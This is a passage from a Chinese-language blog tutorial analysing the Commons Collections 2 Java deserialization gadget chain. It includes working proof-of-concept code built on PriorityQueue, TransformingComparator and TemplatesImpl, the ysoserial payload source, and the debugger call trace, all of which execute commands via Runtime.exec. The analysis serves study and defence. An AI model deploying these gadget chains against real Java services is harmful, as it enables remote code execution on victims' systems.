class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行之后，计算器弹出来了，但报错了</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428232854470-716119011.png" alt="image-20220428232853231"></p><p>根据前面的报错分析，在调用<code>comparator.compare()</code>后，提示 “java.lang.ProcessImpl cannot be cast to java.lang.Comparable”，因为类型不符而报错，和上面那个报错是一样的，但是根据调试发现，程序在反序列化之前就弹出计算器了，那看看是怎么个调用的过程，</p><p>在如下地方打下断点</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428233555440-365558024.png" alt="image-20220428233554728"></p><p>跟进add()方法，发现调用了offer()方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428233638389-700739005.png" alt="image-20220428233637971"></p><p>跟进发现在<code>offer()</code>方法里会有一些if判断，这里如果i！&#x3D;0就会调用<code>siftUp()</code>方法，第一次调用add()方法时，这里的i&#x3D;0，即你不会调用siftUp()方法，当第二次调用add()方法时，就会进入，i&#x3D;1，就进入<code>siftUp()</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428233713262-1085845089.png" alt="image-20220428233712788"></p><p>跟进<code>siftUp()</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428234016305-1312990915.png" alt="image-20220428234015319"></p><p>这里判断comparator是否为空，如果为不空，就调用<code>siftUpUsingComparator()</code>方法，为空则调用<code>siftUpComparable()</code>方法，跟进<code>siftUpUsingComparator()</code>方法，这里会调用<code>comparator#compare()</code>方法，进而导致了计算器的弹出和报错的产生。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428234124506-722393475.png" alt="image-20220428234123995"></p><p>我们返回，跟进<code>siftUpComparable()</code>方法，这里不会导致后续调用链的发生</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428234310569-1479361245.png" alt="image-20220428234310116"></p><p>这里防止报错的关键是让<code>comparator</code>在<code>add()</code>方法调用的时候为空，实例化 <code>PriorityQueue</code> 对象后再通过反射将 <code>comparator</code> 设为 <code>TransformingComparator</code> 对象。</p><p>所以，优化代码后，可构造如下poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformingComparatorTest3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="comment">// 传入 java.lang.Runtime 类</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// 反射调用 getMethod() 方法, 并通过 getMethod() 调用 getRuntime() 方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="comment">// 反射调用 invoke() 方法, 并通过 invoke() 调用上一循环中返回的 Runtime.getRuntime() 方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="comment">// 反射调用 exec() 方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(queue, transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(b1);</span><br><span class="line">        out.writeObject(queue);</span><br><span class="line">        out.close();</span><br><span class="line">        b1.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(b1.toString());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b1.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b2);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        b2.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在进行反序列化的过程中会报同样的错误，但是在报错前就成功执行命令并弹出了计算器</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428235511160-1422424351.png" alt="image-20220428235510084"></p><p>整个 Gadget Chain 的调用过程如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line">    PriorityQueue.heapify()</span><br><span class="line">     PriorityQueue.siftDown()</span><br><span class="line">   PriorityQueue.siftDownUsingComparator()</span><br><span class="line">    TransformingComparator.compare()</span><br><span class="line">     ChainedTransformer.transform()</span><br><span class="line">         ConstantTransformer.transform()</span><br><span class="line">      InvokerTransformer.transform()</span><br><span class="line">       Method.invoke()</span><br><span class="line">       Class.getMethod()</span><br><span class="line">      InvokerTransformer.transform()</span><br><span class="line">       Method.invoke()</span><br><span class="line">        Runtime.getRuntime()</span><br><span class="line">      InvokerTransformer.transform()</span><br><span class="line">       Method.invoke()</span><br><span class="line">        Runtime.exec()</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429000139365-2096780426.png" alt="image-20220429000138216"></p><h3 id="Ysoserial-利用链分析"><a href="#Ysoserial-利用链分析" class="headerlink" title="Ysoserial 利用链分析"></a>Ysoserial 利用链分析</h3><p>对于 Commons Collections 2 这条链，ysoserial 利用的是 <code>TemplatesImpl</code> 类来进行利用的，代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.Queue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Gadgets;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">PriorityQueue.readObject()</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">TransformingComparator.compare()</span></span><br><span class="line"><span class="comment">InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">Method.invoke()</span></span><br><span class="line"><span class="comment">Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@Dependencies(&#123; &quot;org.apache.commons:commons-collections4:4.0&quot; &#125;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.FROHOFF &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Queue&lt;Object&gt;&gt; &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line"><span class="comment">// mock method name until armed</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer));</span><br><span class="line"><span class="comment">// stub data for replacement later</span></span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch method called by comparator</span></span><br><span class="line">Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch contents of queue</span></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">PayloadRunner.run(CommonsCollections2.class, args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面分析下<code>TemplatesImpl</code> 是怎么利用的</p><h3 id="TemplatesImpl-getTransletInstance"><a href="#TemplatesImpl-getTransletInstance" class="headerlink" title="TemplatesImpl.getTransletInstance()"></a>TemplatesImpl.getTransletInstance()</h3><p>函数中可以看到有一处newInstance()方法的调用</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429001032573-1255924666.png" alt="image-20220429001031837"></p><p>在对类进行 <code>newInstance()</code> 实例化操作时，会首先执行类中的无参数构造方法或 <code>static&#123;&#125;</code> 静态块中的内容，下面为测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StaticTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">instance</span><span class="params">(Class className)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        className.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        instance(EvalClass.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EvalClass</span>&#123;</span><br><span class="line"><span class="comment">//    static&#123;</span></span><br><span class="line"><span class="comment">//        try &#123;</span></span><br><span class="line"><span class="comment">//            Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span></span><br><span class="line"><span class="comment">//        &#125; catch (IOException e) &#123;</span></span><br><span class="line"><span class="comment">//            e.printStackTrace();</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvalClass</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StaticTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">instance</span><span class="params">(Class className)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        className.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        instance(EvalClass.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EvalClass</span>&#123;</span><br><span class="line"><span class="comment">//    static&#123;</span></span><br><span class="line"><span class="comment">//        try &#123;</span></span><br><span class="line"><span class="comment">//            Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span></span><br><span class="line"><span class="comment">//        &#125; catch (IOException e) &#123;</span></span><br><span class="line"><span class="comment">//            e.printStackTrace();</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvalClass</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429001233443-2003682571.png" alt="image-20220429001232664"></p><p>可以看到_class[]为存放这Class类的数组，如果控制 <code>_class[_transletIndex]</code> 的值，使其指向我们精心构造的的类，那么，在执行<code>newInstance()</code> 实例化恶意类时，就会触发恶意代码执行</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429001353700-1606609752.png" alt="image-20220429001353107"></p><h3 id="TemplatesImpl-defineTransletClasses"><a href="#TemplatesImpl-defineTransletClasses" class="headerlink" title="TemplatesImpl.defineTransletClasses()"></a>TemplatesImpl.defineTransletClasses()</h3><p>要想执行<code>newInstance()</code>方法，需要满足前面的条件，_name不为空</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429001717315-1531884269.png" alt="image-20220429001716751"></p><p>在执行<code>newInstance()</code>方法前会进入 <code>defineTransletClasses()</code> 方法，进入</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429002213373-1512772555.png" alt="image-20220429002212264"></p><p>在方法中，可以看到在414行代码处，会调用<code>load.defineClass()</code>，学过类加载的知识就知道这里时将 <code>_bytecodes[i]</code> 中的字节码转换成类，并且在下面的if语句中会对转换的类名进行了一个判断，判断父类的类名是否为<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code> ，满足的话就会将索引 <code>i</code> 赋给 <code>_transletIndex</code>，也就是说要想在下面调用newInstance()实例化恶意类，就需要满足我们这个恶意类继承<code>AbstractTranslet</code>。可以知道这里触发的关键在于<code>_bytecodes</code>的赋值，</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429002817204-1446826639.png" alt="image-20220429002816622"></p><p>这里的思路是通过反射获取 <code>_bytecodes</code>，将恶意类的字节码添加到 <code>_bytecodes</code> 中作为一个元素，然后将字节码转换成类并添加到<code>_class[]</code>中，当调用 <code>TemplatesImpl.getTransletInstance()</code> 方法时，执行<code>_class[_transletIndex].newInstance()</code> 进行恶意类的实例化，从而执行恶意代码。</p><p>现在只需要找到调用<code>getTransletInstance()</code> 方法的地方</p><h3 id="TemplatesImpl-newTransformer"><a href="#TemplatesImpl-newTransformer" class="headerlink" title="TemplatesImpl.newTransformer()"></a>TemplatesImpl.newTransformer()</h3><p>在当前类中搜索<code>getTransletInstance()</code>，发现在<code>newTransformer()</code>方法中会调用<code>getTransletInstance()</code> </p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429003327280-1495473657.png" alt="image-20220429003326311"></p><p>可以利用<code>InvokerTransformer</code> 类里的可控反射来调用<code>getTransletInstance()</code> 方法，即构造如下利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line">    PriorityQueue.heapify()</span><br><span class="line">     PriorityQueue.siftDown()</span><br><span class="line">   PriorityQueue.siftDownUsingComparator()</span><br><span class="line">    TransformingComparator.compare()</span><br><span class="line">     InvokerTransformer.transform()</span><br><span class="line">      Method.invoke()</span><br><span class="line">       TemplatesImpl.newTransformer()</span><br><span class="line">        TemplatesImpl.getTransletInstance() -&gt; newInstance()</span><br><span class="line">         Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure><p>构造的poc如下，和ysoserial的poc差不多</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformingComparatorTestExp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/* 设置通过 InvokerTransformer.transform() 调用 newTransformer() 方法 */</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;newTransformer&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>],</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformers);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> 